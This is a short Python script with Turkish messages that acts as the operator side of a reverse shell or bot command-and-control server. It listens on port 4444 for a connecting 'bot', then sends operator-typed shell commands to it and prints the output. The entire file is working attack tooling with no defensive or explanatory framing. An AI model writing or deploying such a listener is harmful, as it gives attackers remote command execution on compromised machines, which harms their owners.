import socket

def start_admin_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    server.bind(("0.0.0.0", 4444))
    
    server.listen(1)
    print("[-] 4444 portu üzerinden bot bekleniyor...")

    target, ip = server.accept()
    print(f"[+] Bot bağlandı! IP: {str(ip)}")

    while True:
        try:
            command = input("Shell> ")
            if not command.strip(): continue
            
            target.send(command.encode())
            
            if command == "exit":
                break
                
            result = target.recv(40960).decode()
            print(result)
            
        except Exception as e:
            print(f"Hata: {e}")
            break

    target.close()
    server.close()

start_admin_server()
